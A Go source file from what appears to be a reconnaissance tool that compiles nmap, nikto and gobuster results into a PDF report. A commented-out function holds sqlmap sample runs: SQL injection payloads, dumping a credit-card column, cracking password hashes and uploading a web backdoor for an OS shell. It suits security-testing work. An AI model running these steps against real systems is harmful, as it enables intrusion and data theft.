package handlepdf

/*
 *	Create a pdf file using gofpdf	-	"github.com/jung-kurt/gofpdf"
 *
 */

import (
	"fmt"
	"log"
	"path"
	"path/filepath"
	"strings"
	"time"

	"github.com/jung-kurt/gofpdf"
	//"github.com/jung-kurt/gofpdf/internal/example"
	tooloutparse "github.com/ren-zxcyq/nier/handle/tooloutparse"
	"github.com/ren-zxcyq/nier/utilities"
)

const fontname = "Times"	//"Courier", "Times", "Arial", "Helvetica"
var u utilities.Utils
var toolparser *tooloutparse.Toolparser

type pdfHandler struct {
	installationDir string
	filename        string
	foldername      string
}

func newPdfHandler(installDir, foldername string) *pdfHandler {
	// fmt.Println("newPDFHANDLER", foldername)
	var h pdfHandler = pdfHandler{installationDir: installDir, foldername: foldername, filename: path.Join(foldername, "Nier_Automaton_Report.pdf")}
	//fmt.Printf("Address of pdfHandler - %p", &h) //	Prints the address of documentHandler
	//fmt.Println(foldername)
	toolparser = tooloutparse.NewToolparser()
	// fmt.Println("asdfasdfasdf", h.filename)
	return &h
}

func (h *pdfHandler) exCreate() {
	pdf := gofpdf.New("P", "mm", "A4", "")
	pdf.AddPage()
	pdf.SetFont("Arial", "B", 16)
	pdf.Cell(40, 10, "Hello, world")
	err := pdf.OutputFileAndClose(h.filename)

	if err != nil {
		log.Println(err)
	}
}

func CreatePdf(installDir, outputFolderName string) {
	// fmt.Println("outputfoldername is", outputFolderName)
	pdfHandler := newPdfHandler(installDir, outputFolderName)
	// pdfHandler.exCreate()
	err := pdfHandler.pdfCreate()
	if err != nil {
		panic(err)
	}
}

// ExampleFpdf_HTMLBasicNew demonstrates internal and external links with and without basic
// HTML.
// func (h *pdfHandler) pdfCreate() {
// 	pdf := gofpdf.New("P", "mm", "A4", "")
// 	// First page: manual local link
// 	pdf.AddPage()
// 	pdf.SetFont("Helvetica", "", 20)
// 	_, lineHt := pdf.GetFontSize()
// 	pdf.Write(lineHt, "To find out what's new in this tutorial, click ")
// 	pdf.SetFont("", "U", 0)
// 	link := pdf.AddLink()
// 	pdf.WriteLinkID(lineHt, "here", link)
// 	pdf.SetFont("", "", 0)
// 	// Second page: image link and basic HTML with link
// 	pdf.AddPage()
// 	pdf.SetLink(link, 0, -1)
// 	pdf.Image(example.ImageFile("logo.png"), 10, 12, 30, 0, false, "", 0, "http://www.fpdf.org")
// 	pdf.SetLeftMargin(45)
// 	pdf.SetFontSize(14)
// 	_, lineHt = pdf.GetFontSize()
// 	htmlStr := `You can now easily print text mixing different styles: <b>bold</b>, ` +
// 		`<i>italic</i>, <u>underlined</u>, or <b><i><u>all at once</u></i></b>!<br><br>` +
// 		`<center>You can also center text.</center>` +
// 		`<right>Or align it to the right.</right>` +
// 		`You can also insert links on text, such as ` +
// 		`<a href="http://www.fpdf.org">www.fpdf.org</a>, or on an image: click on the logo.`
// 	html := pdf.HTMLBasicNew()
// 	html.Write(lineHt, htmlStr)
// 	fileStr := example.Filename("Fpdf_HTMLBasicNew")
// 	err := pdf.OutputFileAndClose(fileStr)
// 	example.Summary(err, fileStr)
// 	// Output:
// 	// Successfully generated pdf/Fpdf_HTMLBasicNew.pdf
// }

/*	pdfCreate()
//	This should be okay so far but let's replace it with the website version.
func (h *pdfHandler) imageFile(fileStr string) string {
	return filepath.Join(gofpdfDir, "image", fileStr)
}


func (h *pdfHandler) pdfCreate() error {
	pdf := gofpdf.New("P", "mm", "A4", "")
	pdf.AddPage()
	pdf.SetFont("Arial", "B", 16)

	// Set Header
	pdf.SetTopMargin(30)
	pdf.SetHeaderFuncMode(func() {
		pdf.Image(h.imageFile("avatar.png"), 10, 6, 30, 0, false, "", 0, "")
		pdf.SetY(5)
		pdf.SetFont("Arial", "B", 15)
		pdf.Cell(80, 0, "")
		pdf.CellFormat(30, 10, "Title", "1", 0, "C", false, 0, "")
		pdf.Ln(20)
	}, true)
	/*
	// CellFormat(width, height, text, border, position after, align, fill, link, linkStr)
	pdf.CellFormat(190, 7, "Nier - Report", "0", 0, "CM", false, 0, "")

	// ImageOptions(src, x, y, width, height, flow, options, link, linkStr)
	pdf.ImageOptions(
		"avatar.jpg",
		20, 20,
		140, 100,	//
		false,
		gofpdf.ImageOptions{ImageType: "JPG", ReadDpi: true},
		0,
		"",
	)

	pdf.CellFormat(190, 7, "- by zxcyq", "0", 0, "CM", false, 0, "")

	return pdf.OutputFileAndClose(h.filename)
}
*/

/*
 *	Creates a document -> Sets Header & Creates a table
 *			uses h.newReport() to do so
 */
func (h *pdfHandler) pdfCreate() error {

	//	Create a new PDF doc & write title & current date
	pdf := h.newReport()

	//	Filter Tool Output

	//	Add Target Table
	pdf = h.targetTable(pdf)

	//	Add Banner Table
	pdf = h.nmapbannertable(pdf)

	pdf = h.httprinttable(pdf)

	pdf = h.httpmethodstable(pdf)

	pdf = h.robotstxttable(pdf)


	//	Add Tools Run Table
	pdf = h.toolsTable(pdf)
	pdf = h.nmapVulnsTable(pdf)
	pdf = h.gobusterDirTable(pdf)
	pdf = h.nmapComments_MAYBE_table(pdf)

	pdf = h.niktotable(pdf)

	if pdf.Err() {
		log.Printf("Failed while creating the PDF Report: %s\n", pdf.Error())
		return pdf.Error()
	}

	//	Save
	err := h.savePDF(pdf)
	if err != nil {
		log.Printf("Cannot save PDF: %s\n", err)
		return err
	}
	return nil
}

//	This creates the Document template
func (h *pdfHandler) newReport() *gofpdf.Fpdf {
	//	New() creates

	//	"mm" unit for expressing lengths & sizes
	//	"Letter" -> Paper format
	//	"L" or "P" -> Orientation
	//	path to a font directory
	pdf := gofpdf.New("P", "mm", "Letter", "")

	//
	pdf.AddPage()

	//	set font
	//		"B" -> bold
	//		int -> size
	pdf.SetFont(fontname, "B", 28)

	//	Write a text cell of length 40 & height 10.
	//		-	no starting coords
	//			Cell() moves the current pos to the end of the cell
	//					next Cell() will continue after
	pdf.Cell(40, 10, "Nier - Report")

	//	Ln()	->	Moves the current pos to a new line
	//				(optional height param)
	pdf.Ln(12)

	pdf.SetFont(fontname, "", 20)
	var date string = time.Now().Format("Mon Sep 9, 2020")
	pdf.Cell(40, 10, date)
	pdf.Ln(12)
	//	Note on Cell() & Ln()
	//
	//	Cell() -> No Coordinates
	//		document keeps them internally
	//		advances to the right by the length of the cell being written
	//	Ln() -> moves current position back to the left border & down
	//			by the provided value

	//	Add Logo
	pdf = h.image(pdf)

	//@HERE
	pdf.SetHeaderFunc(func() {
		//?DONE?@TODO	CHANGE THE IMAGE way to the one used earlier
		//pdf.Image(imageFile("image/avatar.jpg"), 10, 6, 30, 0, false, "", 0, "")
		pdf.ImageOptions(
			h.installationDir+"/image/avatar.jpg",
			// 20, 20,
			// 140, 100,	//
			10, 6,
			30, 0,
			false,
			gofpdf.ImageOptions{ImageType: "JPG", ReadDpi: true},
			0,
			"",
		)
		pdf.SetY(5)
		pdf.SetFont("Arial", "B", 15)
		pdf.Cell(80, 0, "")
		pdf.CellFormat(45, 10, "Nier - Report", "B", 0, "C", false, 0, "")
		pdf.Ln(20)
	})
	pdf.SetFooterFunc(func() {
		pdf.SetY(-15)
		pdf.SetFont("Arial", "I", 8)
		pdf.CellFormat(0, 10, fmt.Sprintf("Page %d/{nb}", pdf.PageNo()), "", 0, "C", false, 0, "")
	})
	pdf.AliasNbPages("") //	Defines an alias for the total number of pages
	pdf.AddPage()
	//	HERE Is the Content
	pdf.SetFont(fontname, "", 12)
	// for j := 1; j <= 40; j++ {
	// 	pdf.CellFormat(0, 10, fmt.Sprintf("Printing line number %d", j), "", 1, "", false, 0, "")
	// }

	return pdf
}

func (h *pdfHandler) header(pdf *gofpdf.Fpdf, hdr []string) *gofpdf.Fpdf {
	pdf.SetFont(fontname, "B", 12)
	pdf.SetFillColor(240, 240, 240)
	for _, str := range hdr {
		//	pdf.CellFormat() -> format the new Cell -> +border +background_fill
		pdf.CellFormat(40, 7, str, "1", 0, "LM", true, 0, "")
	}

	//	Pass	-1 ->	Ln()	i.e. use the height of the last printed Cell as the line height
	pdf.Ln(-1)
	return pdf
}

func (h *pdfHandler) table(pdf *gofpdf.Fpdf, tbl [][]string) *gofpdf.Fpdf {

	//	Font & Fill Color
	pdf.SetFont(fontname, "", 14)
	pdf.SetFillColor(255, 255, 255)

	//	Allign columns according to their contents
	align := []string{"L", "C", "L", "R", "R", "R"} //"No.","Tool"
	for _, line := range tbl {
		for i, str := range line {
			// //	CellFormat() -> Create a visible border around the cell
			// //	alignStr param is used to align the cell content either Left or Right
			// fmt.Println(i,"-hie-",str)
			pdf.CellFormat(40, 7, str, "1", 0, align[i], false, 0, "")
		}
		pdf.Ln(-1)
	}
	return pdf
}

func (h *pdfHandler) singlelinetable(pdf *gofpdf.Fpdf, tbl []string) *gofpdf.Fpdf {

	//	Font & Fill Color
	// pdf.SetFont("Times", "", 12)
	pdf.SetFont(fontname, "", 10) //	fontname, "B", 12
	pdf.SetFillColor(255, 255, 255)	//	(240, 240, 240)

	//	Allign columns according to their contents
	// align := []string{"L", "C", "L", "R", "R", "R"} //"No.","Tool"
	for _, line := range tbl {

		r := strings.TrimSpace(line)
		l := len(r)
		if (l == 0) || (l == 1) {
			// fmt.Println("CONT'D")
			continue
		} else {
			// // for i, str := range line {
			// // // 	//	CellFormat() -> Create a visible border around the cell
			// // // 	//	alignStr param is used to align the cell content either Left or Right
			// // 	fmt.Println(i,"-hie-",str)
			// // 	pdf.CellFormat(40, 7, string(str), "1", 0, align[i], false, 0, "")
			// fmt.Println(string(line))
			pdf.CellFormat(195, 7, string(line), "1", 0, "LM", true, 0, "")
			// }
		}
		pdf.Ln(-1)
	}
	return pdf
}

// // ImageFile returns a qualified filename in which the path to the image
// // directory is prepended to the specified filename.
// func (h *pdfHandler) imageFile(fileStr string) string {
// 	return filepath.Join(h.installationDir, "image", fileStr)
// }

func (h *pdfHandler) image(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
	//	ImageOptions() takes a file path, x,y,width & height params
	//						&	ImageOptions struct to specify a couple of options
	// pdf.ImageOptions(
	// 	h.imageFile("avatar.jpg"),
	// 	255, 10,
	// 	25, 25,
	// 	false,
	// 	gofpdf.ImageOptions{ImageType:"JPG", ReadDpi: true},
	// 	0,
	// 	"",
	// )
	pdf.ImageOptions(
		h.installationDir+"/image/avatar.jpg",
		// 20, 20,
		// 140, 100,	//
		40, 70,
		140, 100,
		false,
		gofpdf.ImageOptions{ImageType: "JPG", ReadDpi: true},
		0,
		"",
	)
	if pdf.Err() {
		fmt.Printf("Failed while adding image to the PDF Report: %s\n", pdf.Error())

	}

	return pdf
}

func (h *pdfHandler) savePDF(pdf *gofpdf.Fpdf) error {
	// fmt.Println("BBBBBBBBBBBBBBB", h.filename)
	return pdf.OutputFileAndClose(h.filename) //	HERE
}

func (h *pdfHandler) targetTable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
	pdf.SetFont(fontname, "B", 14)
	pdf.Cell(40, 10, "Target: Online")
	pdf.Ln(-1)

	// tableCols := []string{"Port", "Service"}
	// tableCont := [][]string{
	// 	{"80", "Apache 2.2"},
	// 	{"110", "Apache 2.2"},
	// }

	////////////////////////////////////////////////////////////////////////////////////////
	//	Filter NMAP output
	var nmapOutFilesURL string = path.Join(h.foldername, "nmap_1_sSV.nmap")
	nmapOutFilesURL = filepath.ToSlash(nmapOutFilesURL)
	//nmapOutFilesURL = strings.Replace(nmapOutFilesURL, ":", "", -1)
	var nmap string = u.ReturnFileContentsStr(nmapOutFilesURL)

	res := toolparser.ParseNmapSV(nmap)

	// fmt.Println("@@@@@@@")
	// fmt.Println(res)
	////////////////////////////////////////////////////////////////////////////////////////
	strCont, err := u.StringToLines(res)
	if err != nil {
		log.Println("Failed while separating lines in formatted tool output")
	}
	//fmt.Println(strCont)
	/*
		var x []string
		for _,v := range strCont {
			// // fmt.Println(k,"-",v)
			// x = strings.Fields(v)
			x = strings.SplitAfterN(v, "\t", 4)
			//fmt.Println(x)
			for u,uu := range x {
				fmt.Println(u,"-",uu)
			}
		}
	*/

	/*	@UNCOMMENT
		tableCols := tableCont[0]
		tableCont = tableCont[1:]
	*/

	pdf = h.singlelinetable(pdf, strCont)

	/*
		for _, line := range tableCont {
			r := strings.TrimSpace(line)
			l := len(r)
			if (l == 0) || (l == 1) || (r == "|") {
				// // fmt.Println(`AAAAAAAAAAAAAAAAAAAAAAA`)
				// // pdf.CellFormat(195, 7, "MARKED", "1", 0, "LM", false, 0, "")
				// // pdf.Ln(-1)
				// continue
				// // // for i, str := range line {
				// // pdf.CellFormat(195, 7, line, "1", 0, "LM", false, 0, "")
				// // pdf.Ln(-1)
				// // // fmt.Println("hELLOS", line)
				// // // }
				continue

			} else {
				// for i, str := range line {
				pdf.CellFormat(195, 7, line, "1", 0, "LM", false, 0, "")
				pdf.Ln(-1)
				// fmt.Println("hELLOS", line)
				// }
				//continue
			}
		}
	*/
	/*	@UNCOMMENT
		pdf = h.header(pdf, tableCols)
		pdf = h.table(pdf, tableCont)

		pdf.SetFont(fontname, "B", 12)
		pdf.SetFillColor(240, 240, 240)
	*/
	return pdf
	// CellFormat(width, height, text, border, position after, align, fill, link, linkStr)
	// pdf.CellFormat(190, 7, "Nier - Report", "0", 0, "CM", false, 0, "")
}

func (h *pdfHandler) toolsTable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
	pdf.AddPage()
	// pdf.Ln(-1)
	//pdf.SetFont("Arial", "B", 16)
	pdf.SetFont(fontname, "B", 14)
	pdf.Cell(40, 12, "Commands Run")
	pdf.Ln(-1)
	tableCols := []string{"Tool", "Description", "Command Opts"}
	tableCont := [][]string{
		{"1", "ping", "Initial interaction", "ping -c 1 $TARGET"},
		{"2", "nmap", "Version scan", "nmap -sSV $TARGET"},
		{"3", "nmap", "Vulnerability scan", "nmap --script=vuln $TARGET"},
		{"4", "nikto", "Vuln Testing", "nikto -h $TARGET"},
		{"5", "gobuster", "Folder Enumeration", "gobuster dir -w -u"},
	}

	//	Create Table Header & Fill
	//pdf = h.header(pdf, tableCols)
	pdf.SetFont(fontname, "", 10)
	pdf.SetFillColor(240, 240, 240)

	pdf.CellFormat(8, 7, "No.", "1", 0, "LM", true, 0, "")
	for i, str := range tableCols { //		for i, str := range tableCols {
		////	pdf.CellFormat() -> format the new Cell -> +border +background_fill
		//pdf.CellFormat(40, 7, str, "1", 0, "LM", true, 0, "")
		if i == 0 {
			pdf.CellFormat(25, 7, str, "1", 0, "CM", true, 0, "")
		} else if i == 1 {
			//	CellFormat() -> Create a visible border around the cell
			//	alignStr param is used to align the cell content either Left or Right
			pdf.CellFormat(50, 7, str, "1", 0, "CM", true, 0, "")
		} else if i == 2 {
			pdf.CellFormat(110, 7, str, "1", 0, "CM", true, 0, "")
		}
		//	Consider handling more columns? even thought this is a specific func.
	}

	//	Pass	-1 ->	Ln()	i.e. use the height of the last printed Cell as the line height
	pdf.Ln(-1)
	//pdf = h.table(pdf, tableCont)
	pdf.SetFont(fontname, "", 10)
	pdf.SetFillColor(255, 255, 255)

	//	Allign columns according to their contents
	align := []string{"L", "C", "L", "L", "R", "R"} //"No.","Tool"
	for _, line := range tableCont {
		for i, str := range line { //	i -> 0, 1,2,3
			if i == 0 {
				pdf.CellFormat(8, 7, line[0], "1", 0, "LM", true, 0, "")
			} else if i == 1 {
				pdf.CellFormat(25, 7, str, "1", 0, align[i], true, 0, "")
			} else if i == 2 {
				//	CellFormat() -> Create a visible border around the cell
				//	alignStr param is used to align the cell content either Left or Right
				pdf.CellFormat(50, 7, str, "1", 0, align[i], true, 0, "")
			} else if i == 3 {
				pdf.CellFormat(110, 7, str, "1", 0, align[i], true, 0, "")
			}
			//	Consider handling more columns? even thought this is a specific func.
		}
		pdf.Ln(-1)
	}

	return pdf
}

func (h *pdfHandler) nmapVulnsTable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf { //*gofpdf.Fpdf

	//return pdf
	var nmapOutFilesURL string = path.Join(h.foldername, "nmap-vuln.nmap")
	// fmt.Println("HHHHHHHHHHHHHHHHHHHHHHH", nmapOutFilesURL)
	nmapOutFilesURL = filepath.ToSlash(nmapOutFilesURL)
	// fmt.Println("HHHHHHHHHHHHHHHHHHHHHHH", nmapOutFilesURL)

	//nmapOutFilesURL = strings.Replace(nmapOutFilesURL, ":", "", -1)
	var nmap string = u.ReturnFileContentsStr(nmapOutFilesURL)

	res := toolparser.ParseNmapVuln(nmap)

	// fmt.Println("@@@@@@@")
	// fmt.Println(res)							//	res contains filtered tool output

	tableCont, err := u.StringToLines(res)
	if err != nil {
		log.Println("Failed while separating lines in formatted tool output")
	}

	pdf.AddPage()
	// pdf.Ln(-1)

	//	Create Table Header & Fill
	//pdf = h.header(pdf, tableCols)
	pdf.SetFont(fontname, "B", 14)
	pdf.SetFillColor(240, 240, 240)

	pdf.Cell(40, 10, "Nmap: Vulnerability Scan Results")
	pdf.Ln(-1)
	// tableCols := []string{"Tool", "Description", "Command Opts"}
	// tableCont := [][]string{
	// 	{"1", "ping", "Initial interaction", "ping -c 1 $TARGET"},
	// }

	pdf.SetFont(fontname, "", 10)
	pdf.SetFillColor(255, 255, 255)

	for _, line := range tableCont {
		r := strings.TrimSpace(line)
		l := len(r)
		if (l == 0) || (l == 1) || (r == "|") {
			// // fmt.Println(`AAAAAAAAAAAAAAAAAAAAAAA`)
			// // pdf.CellFormat(195, 7, "MARKED", "1", 0, "LM", false, 0, "")
			// // pdf.Ln(-1)
			// continue
			// // // for i, str := range line {
			// // pdf.CellFormat(195, 7, line, "1", 0, "LM", false, 0, "")
			// // pdf.Ln(-1)
			// // // fmt.Println("hELLOS", line)
			// // // }
			continue

		} else {
			// for i, str := range line {
			pdf.CellFormat(195, 7, line, "1", 0, "LM", false, 0, "")
			pdf.Ln(-1)
			// fmt.Println("hELLOS", line)
			// }
			//continue
		}
	}

	return pdf
}

//	/root/Desktop/report/nmap-vuln.nmap
//	nmap-vuln.nmap

func (h *pdfHandler) gobusterDirTable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf { //*gofpdf.Fpdf
	pdf.AddPage()

	pdf.SetFont(fontname, "B", 14)
	pdf.Cell(40, 10, "Gobuster Output")
	pdf.Ln(-1)

	////////////////////////////////////////////////////////////////////////////////////////
	//	Filter Gobuster output
	var gobusterOutURL string = path.Join(h.foldername, "gobuster-URLs")
	//gobusterOutURL = filepath.ToSlash(gobusterOutURL)
	//gobusterOutURL = strings.Replace(gobusterOutURL, ":", "", -1)
	// fmt.Println("||||||||||\r\n",gobusterOutURL)
	var gobuster string = u.ReturnFileContentsStr(gobusterOutURL)
	// res := gobuster	//toolparser.ParseNmapSV(gobuster)
	res := toolparser.ParseGobuster(gobuster)
	// fmt.Println("******\r\n",gobuster)
	// fmt.Println("******\r\n",res)

	////////////////////////////////////////////////////////////////////////////////////////
	// fmt.Println("res = ", res)
	// strCont, err := u.StringToLines(res)
	// if err != nil {
	// 	log.Println("Failed while separating lines in formatted tool output")
	// }
	// pdf = h.singlelinetable(pdf, strCont)
	pdf = h.singlelinetable(pdf, res)
	return pdf
}

func (h *pdfHandler) sqlmapTable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
	/*
		available databases [2]:
		[*] information_schema
		[*] webscantest

		Database:
		Table:
		[5 columns]

		| Column	|	Type	|

	*/

	/*
			--dump-all
			--dump

			sqlmap -u "http://www.webscantest.com/datastore/search_get_by_id.php?id=4" --dump -C billing_CC_number -T orders -D webscantest


			Parameter: id (GET)
				Type: boolean-based blind
				Title: AND boolean-based blind - WHERE or HAVING clause
				Payload: id=4 AND 4034=4034

				Type: error-based
				Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
				Payload: id=4 AND (SELECT 3863 FROM(SELECT COUNT(*),CONCAT(0X7172193123))) .... GROUP BY x)a)

				Type: AND/OR time-based blind
				Title: MySQL >= 5.0.12 AND time-based blind
				Payload: id=4 AND SLEEP(2)

				Type: UNION query
				Title: Generic UNION query (NULL) - 4 columns
				Payload: id=4 UNION ALL SELECT NULL, CONCAT (......)

				...


				[08:52:04] [INFO] table 'webscantest.orders' dumped to CSV file '/root/.sqlmap/output/www.webscantest.com/'
				[08:52:04] [INFO] fetched data logged to text files under /root/.sqlmap/output/www.webscantest.com'


				https://github.com/sqlmapproject/sqlmap/wiki/Usage



				sqlmap identified the following injection point(s) with a total of 44 HTTP(s) requests:
				---
				Parameter: id (GET)
					Type: boolean-based blind
					Title: AND boolean-based blind - WHERE or HAVING clause
					Payload: id=1 AND 2623=2623

					Type: error-based
					Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
					Payload: id=1 AND (SELECT 2980 FROM(......))

					Type: AND/OR time-based blind
					Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
					Payload: id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))MVIi)

					Type: UNION query
					Title: Generic UNION query (NULL) - 3 columns
					Payload: id=1 UNION ALL SELECT NULL, CONCAT(...., ....,....), NULL-- GseO
				---
				[17:22:22] [INFO] the back-end DBMS is MySQL
				[17:22:22] [INFO] fetching banner
				web application technology: PHP 5.2.6, Apache 2.2.9
				back-end DBMS: MySQL 5.0
				banner:		'5.1.41-3~bpo50+1'
				[17:22:22] [INFO] fetched data logged to text files under '/home/stamparm/.sqlmap/output/debiandev'

		=====

		python sqlmap.py -u "http://debiandev/sqlmap/mysql/get_int.php?id=1" --batch --password
		[17:22:22] [INFO] fetching database users password hashes
		do you want .....with other tools [y/N] N
		do you want .....against retrieved password hashes? [Y/n/q] Y
		[17:22:22] [INFO] using hash method 'mysql_passwd'
		what dictionary do you want to use?
		[1] default dictionary file '' (press Enter)
		[2] custom dictionary file
		[3] file with list of dictionary files
		> 1
		[17:22:22] [INFO] using default dictionary
		....
		...
		...
		[17:22:22] [INFO] cracked password 'testpass' for user 'root'
		[*] debian-sys-maint [1]:
			password hash: *ASDFASLDKFJASLDKFJASDF
		[*] root [1]:
			password hash: *ASDFASDFASDFASDFASDFAS
			clear-text password: testpass

		=====

		python ... --batch --dbs
		...
		[17:22:22] [INFO] fetching database names
		available databases [5]:
		[*] information_schema
		[*] master
		[*] mysql
		[*] owasp10
		[*] testdb

		... fetched...


		python ... --batch --tables -D testdb
		[17:22:22] [INFO] fetching tables for database: 'testdb'
		Database: testdb
		[1 table]
		+-------+
		| users |
		+-------+

		... fetched ...

		===

		--batch --dump -T users -D testdb
		[17:22:22] [INFO] fetching columns for table 'users' in database 'testdb'
		[17:22:22] [INFO] fetching entries for table 'users' in database 'testdb'
		[17:22:22] [INFO] analyzing table dump for possible password
		Database: testdb
		Table: users
		[4 entries]
		+-----+-----------+--------------------------+
		 1
		 2
		 3
		 4   | ........

		[17:22:22] [INFO] table 'testdb.users' dumped to CSV file '/home/....'
		[17:22:22] [INFO] fetched data logged to text files under '/home/....'


		===
		python sqlmap.py -u "http://debiandev/..." --batch --os-shell
		[17:22:22] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
		[17:22:22] [INFO] the file stager has been successfully uploaded on '/var/www/' - http:// ....
		[17:22:22] [INFO] the backdoor has been successfully uploaded on '/var/www/' - http://debiandev:80/tmpbsadf.php
		[17:22:22] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER

		os-shell> pwd
		do you want to retrieve the command standard output? [Y/n/a] Y
		command standard output:
		---
		INFORMIXTMP
		bin
		boot
		cdrom
		dev
		etc
		---
		os-shell> exit
		[17:22:22] [INFO] cleaning up the web files uploaded
		[17:22:22] [WARNING] HTTP error codes detected during run:
		404 (Not Found) - 2 times
		[17:22:22] [INFO] fetched data logged to text files under '/home/...'

		...
	*/
	return nil
}

func (h *pdfHandler) nmapbannertable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
	//	nmap banner grabbing
	//	nmap -p- -Pn -vv -sTV -T5 --script=banner -oA /root/Desktkop/nmap-banners 192.168.1.20
	pdf.AddPage()

	pdf.SetFont(fontname, "B", 14)
	pdf.Cell(40, 10, "Nmap: Banners Scan")
	pdf.Ln(-1)

	//	Filter output
	var nmapBannersOutURL string = path.Join(h.foldername, "nmap-banners.nmap")
	var bannersout string = u.ReturnFileContentsStr(nmapBannersOutURL)
	res := toolparser.ParseBanners(bannersout)

	pdf = h.singlelinetable(pdf, res)
	
	return pdf
}


func (h *pdfHandler) nmapComments_MAYBE_table(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
	// BELOW or nmap -p80 --script=http-* -oN .. 192.168.1.20
	// nmap -p80 --script=http-comments-displayer 192.168.1.20 -oN ouptputdir+'/nmap-comments-displayer'
	pdf.AddPage()

	pdf.SetFont(fontname, "B", 14)
	pdf.Cell(40, 10, "Nmap: Perhaps Interesting Application Comments")
	pdf.Ln(-1)

	//	Filter output
	var nmapCommentsOutURL string = path.Join(h.foldername, "nmap-comments.nmap")
	var commentsout string = u.ReturnFileContentsStr(nmapCommentsOutURL)
	res := toolparser.ParseComments(commentsout)

	pdf = h.singlelinetable(pdf, res)

	return pdf
}

func (h *pdfHandler) httprinttable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
	pdf.AddPage()

	pdf.SetFont(fontname, "B", 14)
	pdf.Cell(40, 10, "httprint: Web Server Fingerprinting - Version Guessing")
	pdf.Ln(-1)

	//	Filter output
	var httprintOutURL string = path.Join(h.foldername, "httprint-srv-version")
	var httprintout string = u.ReturnFileContentsStr(httprintOutURL)
	res := toolparser.ParseHTTPrint(httprintout)

	pdf = h.singlelinetable(pdf, res)

	return pdf
}

func (h *pdfHandler) niktotable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {

	pdf.AddPage()

	pdf.SetFont(fontname, "B", 14)
	pdf.Cell(40, 10, "nikto: Web Server Vulnerability Testing")
	pdf.Ln(-1)

	//	Filter output
	var niktoOutURL string = path.Join(h.foldername, "nikto.txt")
	var niktoout string = u.ReturnFileContentsStr(niktoOutURL)
	res := toolparser.ParseNikto(niktoout)

	pdf = h.singlelinetable(pdf, res)

	return pdf
}

func (h *pdfHandler) httpmethodstable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
	
	pdf.AddPage()

	pdf.SetFont(fontname, "B", 14)
	pdf.Cell(40,10, "HTTP: Method - Status")
											//	@TODO	Add	-	Check: httptesting.txt")
	pdf.Ln(-1)


	var httptestingOutURL string = path.Join(h.foldername, "httptesting.txt")
	var httptestingout string = u.ReturnFileContentsStr(httptestingOutURL)
	res := toolparser.ParseHTTPMethods(httptestingout)

	pdf = h.singlelinetable(pdf, res)

	return pdf
}

func (h *pdfHandler) robotstxttable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
	pdf.AddPage()

	pdf.SetFont(fontname, "B", 14)
	pdf.Cell(40,10, "HTTP: Method - Status")
											//	@TODO	Add	-	Check: httptesting.txt")
	pdf.Ln(-1)

	var robotstxtOutURL string = path.Join(h.foldername, "/getrobots.txt")
	var robotstxtout string = u.ReturnFileContentsStr(robotstxtOutURL)
	res := toolparser.ParseRobots(robotstxtout)

	pdf = h.singlelinetable(pdf, res)


	return pdf
}

func (h *pdfHandler) whatwebtable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
	pdf.AddPage()
	return nil
}

func (h *pdfHandler) wpscantable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
	//	@TODO	tool output is a folder		Consider just using a str for this
	// h.execCmd(h.e.tools["wpscan"] + " -o " + filepath.ToSlash(path.Join(h.e.outputFolder, "/wpscan-out")) + " --url " + h.e.targetHost)
	pdf.AddPage()

	return nil
}

func (h *pdfHandler) todo() {
	//	httprint -h 192.168.1.20 -P0 -s /usr/share/httprint/signatures.txt -o OUTPUTFILE
	//	whatweb -v -a4 192.168.1.20 --log-verbose OUTPUTFILE
	//	whatweb -v -a3 192.168.1.20:80 -u=usern@mail.com:password --log-verbose OUTPUTFILE

	//	nmap -p 80 --script http-methods 192.168.1.20
	//				http-headers
	//				http-methods
	//				http-apache-negotiation
	//				http-date

	//	wpscan --url 192.168.1.20				//	--wp-content-dir, --scope option, --url value given is the correct one

	//	python Blindelephant.py http://192.168.1.20:80 guess

	//	nmap -p80 --script=http-comments-displayer 192.168.1.20 -oN OUTPUTFILE

	//	turbolist3r
	//	arachni

	//	nikto -h TARGET:80 -Tuning x 6 -o OUTPUTFILE -Format txt
	//				-id user@email.com:password

}
